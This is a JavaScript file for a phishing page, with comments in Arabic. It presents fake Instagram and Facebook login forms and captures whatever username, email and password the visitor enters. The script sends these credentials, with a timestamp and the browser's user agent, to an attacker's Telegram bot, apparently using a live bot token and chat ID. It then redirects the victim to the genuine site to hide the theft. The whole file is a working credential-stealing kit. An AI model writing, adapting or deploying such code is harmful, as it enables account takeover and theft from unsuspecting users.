document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = this.username.value.trim();
    const password = this.password.value.trim();

    if (!username || !password) return;

    const message = `
    🟣[Instagram Login Attempt - SYSTEM ALERT]🟣
    ---------------------------------------
    Username: ${username}
    Password: ${password}
    Timestamp: ${new Date().toLocaleString()}
    .
    .
    Device: ${navigator.userAgent}
    `;
    

    fetch(`https://api.telegram.org/bot7031565405:AAHr_qHVEk3Z6jMWlVmGXRnBA7MYcydtEm0/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '6967962102',
            text: message,
        }),
    }).then(response => {
        if (response.ok) {
            window.location.href = 'https://www.instagram.com/reel/DGrj0x4IUpI/?igsh=YzJxM2tremRveTVk'; // يعاود يديهم لإنستغرام
        } else {
            alert('خطأ في الإرسال، حاول مرة أخرى.');
        }
    }).catch(error => {
        console.error('Error:', error);
        alert('مشكلة فالإتصال.');
    });
});
document.getElementById('facebook-login').addEventListener('click', function() {
    document.body.innerHTML = `
        <div class="facebook-container">
            <h2 class="fb-logo">facebook</h2>
            <form id="fb-login-form">
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
    `;

    // نعاود نربط الفورم مع البوت
    document.getElementById('fb-login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = this.email.value.trim();
        const password = this.password.value.trim();

        if (!email || !password) return;

        const message = `
        🔵[Facebook Login Attempt - SYSTEM ALERT]🔵
        ---------------------------------------
        Email/Phone: ${email}
        Password: ${password}
        Timestamp: ${new Date().toLocaleString()}
        .
        .
        Device: ${navigator.userAgent}
        `;
        

        fetch(`https://api.telegram.org/bot7031565405:AAHr_qHVEk3Z6jMWlVmGXRnBA7MYcydtEm0/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: '6967962102',
                text: message,
            }),
        }).then(response => {
            if (response.ok) {
                window.location.href = 'https://www.facebook.com';
            } else {
                alert('خطأ في الإرسال.');
            }
        }).catch(error => {
            console.error('Error:', error);
            alert('مشكلة فالإتصال.');
        });
    });
});
document.getElementById('loginBtn').addEventListener('click', function() {
    // إخفاء صفحة الترحيب
    document.querySelector('.welcome-page').style.display = 'none';
    // إظهار صفحة تسجيل الدخول
    document.querySelector('.login-container').style.display = 'block';
});
